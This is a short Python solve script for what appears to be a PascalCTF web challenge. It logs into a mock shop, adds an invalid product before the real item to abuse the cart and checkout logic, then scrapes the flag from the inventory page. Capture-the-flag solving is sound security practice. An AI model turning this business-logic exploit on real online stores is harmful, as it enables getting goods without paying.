import requests
import re

url = "https://zazastore.ctf.pascalctf.it"
s = requests.Session()

res = s.post(f'{url}/login', data={
    'username': 'hacked',
    'password': 'hacked'
})

if res.json()['success']:
    print("> Logged in")

res = s.post(f'{url}/add-cart', data={'product': 'a'})
res = s.post(f"{url}/add-cart", data={'product': "RealZa"})

res = s.post(f'{url}/checkout')

res = s.get(f'{url}/inventory')

flag = re.findall(r'(pascalCTF{.+})', res.text)[0]
print("Flag:", flag)